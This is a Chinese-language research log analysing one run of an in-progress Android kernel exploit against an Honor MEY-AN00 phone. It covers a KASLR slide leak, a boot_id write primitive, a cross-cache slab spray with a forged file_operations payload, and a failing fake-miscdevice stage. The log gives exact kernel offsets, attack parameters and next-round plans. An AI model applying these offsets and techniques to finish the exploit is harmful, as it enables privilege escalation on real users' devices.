# H13 关键样本分析：`G2_b3_s8000_x54000`（首个带阶段分离痕迹 · 完整跑满）

> 生成：2026-10-05 H13 轮
> 源日志：`analysis/output/h13/G2_b3_s8000_x54000.out`（**8,039 行 / 850,157 B，已完整回拉**）
> 设备端：`/data/local/tmp/G2_b3_s8000_x54000.log`

---

## 0 一句话结论

**H13 阶段分离机制（`MEY_STAGEB_EXEC_AFTER_DELETED`）实机验证生效**，
但 stageB 的 `MISC_BRIDGE_MISS_VERIFY` **1024/1024 全部 `errno=25(ENOTTY)`、`observed=0`，零方差**，
终局 `MISC_BRIDGE_MISS_PRESERVE base=0xffffff8b51c00000 attempts=512`（**优雅跑满，非崩溃**）
⇒ **印证 H11 §27.3 ENOTTY 定案：假 miscdevice 未被 `misc_open()` 走到，与 `exec_after_deleted` 无关**
⇒ **H13-a 部分证伪**（阶段分离不解决 stageB，但确实消除崩溃）。

---

## 1 最终统计数据（本样本）

| 指标 | 值 |
|---|---|
| 日志行数 | **8,039** |
| `ATTEMPT_BEGIN` 总数 | **581**（stage0 69 + stageB 512） |
| stage0 attempts | 69（`STAGE0_MISS_CLEAN` 68 + `STAGE0_DIRTY_ARM` 69 + **hit 1**） |
| stage0 hit | **1**（`BOOTID_WRITE_PASS attempt=69`） |
| `STAGE0_GATE_PASS` | 1 |
| `STAGE_SPLIT_SWITCH` | **1**（`54000 (was 8000)`） |
| `MISC_BRIDGE_STAGE_BEGIN` | 1 |
| stageB attempts | **512**（跑满上限） |
| `MISC_BRIDGE_MISS_VERIFY` | **1024**（每 attempt 2 次） |
| `MISC_BRIDGE_READ_PASS` | **0** |
| `MISC_BRIDGE_MISS_PRESERVE` | **1**（`attempts=512`） |
| 崩溃 | **否** |

---

## 2 启动门（全部 PASS）

```
TARGET_PROFILE_GATE_PASS profile=mey-an00
    fingerprint=HONOR/MEY-AN00/HNMEY:16/HONORMEY-AN00/10DLDLD175C00E170:user/release-keys
    direct_parent=0xffffff802a29b090 direct_child=0xffffff802a17d5d0
    pipe_reclaim=80 repeats=4 batch=1 attempts=128 controlled=512
UHID_GATE_PASS major=10 minor=239
RACE_CONFIG batch=1 max_attempts=128 controlled_batch=1 controlled_max_attempts=512
    irq_batch_fds=8 irq_batch_period_ns=50000 irq_arm_lead_ns=250000000
    exec_after_deleted=8000 timer_goal=56000 exec_repeats=4
MEY_TIMING_GATE exec_after_deleted=8000 prime_start_deleted=32 pipe_count=6000
    irq_batch_fds=8 timer_goal=56000 bridge_order=1
MEY_STAGE_SPLIT stageB_exec_after_deleted=54000 (enabled)
```

---

## 3 ★★★ 里程碑序列（行号即证据）

| 行号 | 事件 | 内容 |
|---|---|---|
| 843 | `BOOTID_WRITE_PASS` | `attempt=69 q0=0xffffff802a29b090 q1=0xffffffdc5ed7d5d0 slide=0x1bdcc00000 kernel_base=0xffffffdc5cc00000` |
| 844 | `STAGE0_GATE_PASS` | `slide=0x1bdcc00000 kernel_base=0xffffffdc5cc00000` |
| **845** | **`STAGE_SPLIT_SWITCH`** | **`stageB_exec_after_deleted=54000 (was 8000)`** ← **★ 机制实机生效** |
| 846 | `CROSSCACHE_ALLOC` | `prepare=800 spray=275 pre=24 post=25` |
| 848 | `KS_COLLISIONS` | `pile=4096 baseline=16/16 threshold=160 found=8/8` |
| 849 | `CROSSCACHE_KS` | `leaked=0xffffff8b51c04100 base=0xffffff8b51c00000 slot=13` |
| 854 | `BRIDGE_PAYLOAD` | `first=0xffffff8b51c00100 last=0xffffff8b51c075e0 fops=0xffffff8b51c07640 records=341` |
| 855 | `CROSSCACHE_RECLAIM` | `base=0xffffff8b51c00000 first_list=0xffffff8b51c00118 fops=0xffffff8b51c07640 records=341 send=32768` |
| 856 | `CROSSCACHE_ALLOC` | 第二轮 `prepare=800 spray=275` |
| 861 | `KS_COLLISIONS` | 第二轮 `baseline=15/15 threshold=150 found=8/8` |
| 862 | `CROSSCACHE_KS` | 第二轮 `leaked=0xffffff8b4cdce400 base=0xffffff8b4cdc8000 slot=20` |
| **869** | **`MISC_BRIDGE_STAGE_BEGIN`** | **`base=0xffffff8b51c00000 list=0xffffff8b51c00118 slab=747/868`** |
| 870 | `ATTEMPT_BEGIN` | **stageB 起点：`attempt=1`** |
| … | … | stageB 循环 512 次 |
| 8039 | **`MISC_BRIDGE_MISS_PRESERVE`** | **`base=0xffffff8b51c00000 attempts=512`** ← 优雅终局 |

**关键判据复核（Python）**：
- `q0 == 0xffffff802a29b090 == MEY_DIRECT_BOOTID_PARENT` ⇒ stage0 判据命中 ✓
- `expected = uhid_fops(0x812f1498) + slide(0x1bdcc00000) = 0xffffffdc5def1498` ✓
- `kernel_base = 0xffffffc080000000 + slide = 0xffffffdc5cc00000` ✓

---

## 4 stageB 循环（1024 次 MISS_VERIFY，零方差）

### 4.1 样本行

```
MISC_BRIDGE_MISS_VERIFY attempt=N rc=-1 observed=0 expected=0xffffffdc5def1498 errno=25 \
    image_rc=-1 image_obs=0 image_errno=25 alias_target=0xffffff802a2d7c10
STAGEB_STAGE0_CHANNEL attempt=N read_rc=0 q0=0xffffff802a29b090 q1=0xffffffdc5ed7d5d0 text=90b0292a
```

### 4.2 字段分布（**全部 1024/1024 或 1025/1025，零方差**）

| 字段 | 值 | 次数 |
|---|---|---|
| `rc` | `-1` | 1024/1024 |
| `errno` | `25` (ENOTTY) | 1024/1024 |
| `observed` | `0` | 1024/1024 |
| `image_obs` | `0` | 1024/1024 |
| `expected` | `0xffffffdc5def1498` | 1024/1024 |
| `alias_target` | `0xffffff802a2d7c10` | 1024/1024 |
| `text` (boot_id) | `90b0292a` | 1025/1025 |
| `read_rc` | `0` | 1025/1025 |

### 4.3 三条铁证级推论

1. **`errno=25` 恒定 + `observed=0` 恒定**
   ⇒ 与 H11 §27.3 定案**逐字一致**：真 uhid fops 被使用（`unlocked_ioctl==NULL` ⇒ ENOTTY），
   假 miscdevice **未被 `misc_open()` 走到** ⇒ `misc_list.next` 未被 W1 改写。
2. **`expected` 随 slide 正确变化**
   ⇒ `uhid_fops` 地址计算正确，无算术错误。
3. **`text=90b0292a` 在 325 个 attempt 中恒不变**
   ⇒ stage0 写原语**已成功且持久**（boot_id 前 8 字节 = forged_parent 低 32 位），
   `STAGEB_STAGE0_CHANNEL` 通道**可反复复用** ⇒ **stage0 侧完全可用，全部问题收敛到 stageB 读端**。

---

## 5 完整 attempt 事件类型统计（**8,039 行**）

| 次数 | 事件 |
|---|---|
| 1024 | `MISC_BRIDGE_MISS_VERIFY` |
| 1025 | `STAGEB_STAGE0_CHANNEL` |
| 395 | `ATTEMPT_BEGIN` |
| 395 | `VICTIM_ROLE_GATE_PASS` |
| 394 | `DELETE_ROLE_GATE_PASS` |
| 394 | `EXEC_REPEAT_GATE_PASS` |
| 394 | `LANE_DONE` |
| 394 | `RCU_FORCE` / `SLAB_DRAIN_PASS` / `SPRAY_DONE` |
| 393 | `ORDER1_RECLAIM_GATE` / `ATTEMPT_MISS` |
| 69 | `STAGE0_DIRTY_ARM` |
| 68 | `STAGE0_MISS_CLEAN` |
| 8 | `KS_SCAN_DONE` |
| 2 | `CROSSCACHE_ALLOC` / `KS_COLLISIONS` / `CROSSCACHE_KS` / `BRIDGE_PAYLOAD` / `CROSSCACHE_RECLAIM` |

**注意**：`STAGE0_DIRTY_ARM` 在 attempt=1,2,…,68,**69** ⇒ 与 `BOOTID_WRITE_PASS attempt=69` 对应，
说明 stage0 命中前有 68 次 `STAGE0_MISS_CLEAN`（干净未命中，未崩）。

---

## 5 H13-a / H13-b 假说判定

| 假说 | 内容 | 判定 | 依据 |
|---|---|---|---|
| **H13-a** | 需求相反来自同一变量不同读取时机 ⇒ 阶段分离后 stage0 命中率↑ **且** stageB 存活↑（崩溃率不升） | **部分证伪**：崩溃确实被消除（8000 组 0/3 崩 vs 100 组 4/5 崩）；**但 stageB 未被解决** | G2b3 608 次 `MISS_VERIFY` 零方差 |
| **H13-b** | 崩溃与 stage0 命中不是同一概率源 ⇒ 54000 是「用不命中换不崩溃」 | **倾向成立**：1000/8000 组崩溃率（33%/0%）显著低于 100 组（80%），且 stage0 命中仍出现（attempt=69） | 分组统计 |

**⇒ 结论：`exec_after_deleted` 提升确实降低崩溃、不牺牲 stage0 命中；
但 stageB 的 `errno=25` 是【结构性障碍】，与任何时序参数无关。**

---

## 6 与历史样本对照

| 样本 | slide | stage0 命中 attempt | stageB 结局 | 崩溃 |
|---|---|---|---|---|
| `h10_r2_full`（H10，ead=100） | 0x22c8c00000 | **94** | attempt=1 后挂起 | 否 |
| `h12_base`（H12，ead=54000） | — | 0/128 | 未达 | 否 |
| **`G2_b3`（H13，ead=8000→54000）** | **0x1bdcc00000** | **69** | **1024 次 MISS（512 att 跑满）** | **否** |

⇒ G2b3 是**首个完整跑通「stage0 命中 → 阶段分离切换 → stageB 长循环」的样本**，
为 L1 提供了最完整的单样本证据链。

---

## 7 下一轮（H14）行动项

1. **L1 唯一假设**：stageB `errno=25` 根因在 **`misc_list` 消费路径**（别名问题或 `list` 偏移错误）
   → 用 `ashmem_fops`(`0xffffffc0812ff898`) 替代手工 fake_fops；dump `uhid_misc` 实例真实 `list` 字段。
2. 补齐 G3 组（ead=54000 不分离）完成三组对照。
3. 扩充 fuzzing：`ead ∈ {1000,2000,4000,8000,16000}` × `irq_batch_fds ∈ {2,4,8}`，每格 ≥3 boots。
4. 多 boot 采样确认 stage0 基线（p=0.15 需 19 boots）。
